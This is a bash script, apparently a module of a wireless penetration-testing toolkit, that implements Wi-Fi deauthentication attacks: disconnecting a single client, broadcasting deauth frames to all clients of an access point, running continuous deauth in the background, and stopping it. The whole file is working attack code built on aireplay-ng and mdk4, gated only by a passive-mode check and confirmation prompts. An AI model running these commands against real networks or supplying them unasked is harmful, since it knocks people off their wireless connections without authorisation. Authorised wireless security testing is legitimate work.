#!/bin/bash
# Targeted deauthentication attacks

rt_deauth() {
  local choice
  choice=$(menu_pick "Deauth Attacks" \
    "Deauth Single Client" \
    "Deauth All Clients (AP)" \
    "Continuous Deauth" \
    "Stop Deauth")
  
  case "$choice" in
    1) deauth_single ;;
    2) deauth_all ;;
    3) deauth_continuous ;;
    4) deauth_stop ;;
    0|"") return ;;
  esac
}

deauth_single() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - deauth blocked"
    return 1
  fi
  
  if ! confirm_danger "Send deauth frames? This will disconnect the target client."; then
    return 1
  fi
  
  local ap_mac
  ap_mac=$(MAC_PICKER "Target AP BSSID" "AA:BB:CC:DD:EE:FF")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local client_mac
  client_mac=$(MAC_PICKER "Client MAC" "11:22:33:44:55:66")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local count
  count=$(NUMBER_PICKER "Deauth count (0=continuous)" 10)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Monitor interface" "wlan0mon")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Sending $count deauth frames..."
  LOG "AP: $ap_mac"
  LOG "Client: $client_mac"
  
  if have aireplay-ng; then
    aireplay-ng -0 "$count" -a "$ap_mac" -c "$client_mac" "$iface" 2>&1 | head -20
    LOG green "Deauth sent"
  elif have mdk4; then
    echo "$ap_mac $client_mac" > /tmp/deauth_targets.txt
    timeout 10 mdk4 "$iface" d -b /tmp/deauth_targets.txt 2>&1 | head -20
    LOG green "Deauth sent via mdk4"
  else
    LOG red "aireplay-ng or mdk4 required"
  fi
}

deauth_all() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Deauth ALL clients from AP? This is very disruptive."; then
    return 1
  fi
  
  local ap_mac
  ap_mac=$(MAC_PICKER "Target AP BSSID" "AA:BB:CC:DD:EE:FF")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local count
  count=$(NUMBER_PICKER "Deauth count" 20)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Monitor interface" "wlan0mon")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Sending $count broadcast deauth frames to $ap_mac..."
  
  if have aireplay-ng; then
    aireplay-ng -0 "$count" -a "$ap_mac" "$iface" 2>&1 | head -20
    LOG green "Broadcast deauth sent"
  elif have mdk4; then
    echo "$ap_mac" > /tmp/deauth_ap.txt
    timeout 10 mdk4 "$iface" d -b /tmp/deauth_ap.txt 2>&1 | head -20
  else
    LOG red "aireplay-ng or mdk4 required"
  fi
}

deauth_continuous() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Start CONTINUOUS deauth? This will run in background until stopped."; then
    return 1
  fi
  
  local ap_mac
  ap_mac=$(MAC_PICKER "Target AP BSSID" "AA:BB:CC:DD:EE:FF")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Monitor interface" "wlan0mon")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting continuous deauth (background)..."
  
  if have aireplay-ng; then
    nohup aireplay-ng -0 0 -a "$ap_mac" "$iface" > "$ARTIFACT_DIR/deauth.log" 2>&1 &
    echo $! > /tmp/deauth.pid
    LOG green "Continuous deauth started (PID: $(cat /tmp/deauth.pid))"
    LOG "Stop with: Deauth > Stop Deauth"
  elif have mdk4; then
    echo "$ap_mac" > /tmp/deauth_ap.txt
    nohup mdk4 "$iface" d -b /tmp/deauth_ap.txt > "$ARTIFACT_DIR/deauth.log" 2>&1 &
    echo $! > /tmp/deauth.pid
    LOG green "Continuous deauth started"
  else
    LOG red "aireplay-ng or mdk4 required"
  fi
}

deauth_stop() {
  LOG blue "Stopping deauth attacks..."
  
  if [[ -f /tmp/deauth.pid ]]; then
    kill "$(cat /tmp/deauth.pid)" 2>/dev/null
    rm -f /tmp/deauth.pid
  fi
  
  pkill -f aireplay-ng 2>/dev/null || true
  pkill -f "mdk4.*d" 2>/dev/null || true
  
  LOG green "Deauth stopped"
}
